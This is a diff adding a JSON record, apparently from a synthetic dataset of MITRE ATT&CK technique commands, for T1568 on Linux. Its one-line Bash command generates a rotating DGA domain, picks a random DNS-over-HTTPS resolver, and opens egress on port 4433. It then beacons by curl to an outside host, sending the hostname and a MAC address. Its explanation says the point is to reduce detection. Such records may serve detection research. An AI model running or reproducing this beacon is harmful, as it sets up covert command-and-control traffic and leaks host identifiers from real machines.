@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"kappa\"; LABEL=$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d%H%M)\" | sha1sum | cut -c1-10); FQDN=\"${LABEL}.cdn-route.xyz\"; PORT=4433; DOH=$(shuf -e https://cloudflare-dns.com/dns-query https://dns.google/dns-query https://dns.quad9.net/dns-query -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; curl -sSf --doh-url \"$DOH\" --max-time 5 --retry 1 --header \"X-Client: $(hostname -s)\" \"https://${FQDN}:${PORT}/beacon?mac=$(cat /sys/class/net/*/address 2>/dev/null | head -n1)\"",
+  "explanation": "Rotates DoH resolvers to dynamically resolve a minute-based DGA domain and beacons over port 4433, reducing detection via varied resolution paths and ports.",
+  "rationale_steps": [
+    "Generate fast-rotating DGA domain",
+    "Randomly choose a DoH provider",
+    "Open egress to nonstandard TLS port",
+    "Send beacon with minimal timing window"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-e18bbd99",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
